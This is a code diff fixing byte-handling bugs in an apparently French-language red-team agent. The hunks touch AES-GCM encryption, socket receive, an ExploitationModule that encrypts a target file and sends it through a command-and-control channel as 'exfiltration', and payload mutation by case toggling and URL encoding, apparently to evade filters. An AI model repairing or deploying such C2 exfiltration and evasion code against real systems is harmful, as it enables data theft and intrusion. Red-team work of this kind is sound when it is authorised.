@@ -72,7 +72,7 @@ def sha8(data: bytes) -> str:
 def encrypt_data(data: bytes, key: bytes) -> bytes:
     cipher = AES.new(key, AES.MODE_GCM)
     ciphertext, tag = cipher.encrypt_and_digest(data)
-    return cipher.nonce + tag + ciphertext
+    return bytes(cipher.nonce) + bytes(tag) + bytes(ciphertext)
 
 def decrypt_data(data: bytes, key: bytes) -> bytes:
     nonce = data[:16]
@@ -112,9 +112,9 @@ def safe_recv(sock: socket.socket, max_bytes: int = MAX_RESPONSE_BYTES,
             break
         if not chunk:
             break
-        chunks.append(chunk)
+        chunks.append(bytes(chunk))
         total += len(chunk)
-    return b"".join(chunks)
+    return bytes(b"".join(chunks))
 
 import os
 
@@ -214,7 +214,7 @@ class ExploitationModule:
             encrypted_data = encrypt_data(data, C2_ENCRYPTION_KEY)
             
             # Simulation d'exfiltration via C2
-            self.send_to_c2('exfiltration', {'file': target_path, 'size': len(data)}, encrypted_data)
+            self.agent.c2_module.send_to_c2('exfiltration', {'file': target_path, 'size': len(data)}, encrypted_data)
             print(f"[+] Données exfiltrées: {target_path}")
             return True
         except Exception as e:
@@ -1149,7 +1149,7 @@ class ActiveRedTeamAgent:
             elif op < 0.6 and len(p) > 5:
                 # Changer la casse d'un caractère
                 idx = self.rng.randint(0, len(p)-1)
-                if p[idx].isalpha():
+                if chr(p[idx]).isalpha():
                     p[idx] ^= 0x20  # Toggle case
             elif op < 0.9 and len(p) > 5:
                 # URL encode un caractère
